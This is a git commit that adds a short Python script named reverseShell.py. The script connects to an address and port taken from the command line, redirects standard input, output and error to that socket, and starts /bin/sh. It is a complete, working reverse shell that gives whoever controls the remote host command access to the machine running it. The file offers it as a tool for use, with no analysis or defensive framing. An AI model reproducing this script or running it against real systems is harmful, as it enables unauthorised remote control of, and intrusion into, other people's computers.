6aa0d1a440d86fe8ca7ae81247239ba87f2c0fcb
ErilinAleksei <43059387+ErilinAleksei@users.noreply.github.com>
2021-07-16 14:26:05 +0300

    Create reverseShell.py

---
+++ linux/reverseShell.py
@@ -0,0 +1,18 @@
+#! /bin/python
+
+import subprocess, os, sys, socket
+
+def shell(addr, port):
+	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	sock.connect((addr, int(port)))
+	os.dup2(sock.fileno(), 0)
+	os.dup2(sock.fileno(), 1)
+	os.dup2(sock.fileno(), 2)
+	subprocess.call(["/bin/sh"])
+	sock.close()
+	
+def main():
+	shell(sys.argv[1], sys.argv[2])	
+	
+if __name__ == '__main__':
+	main()
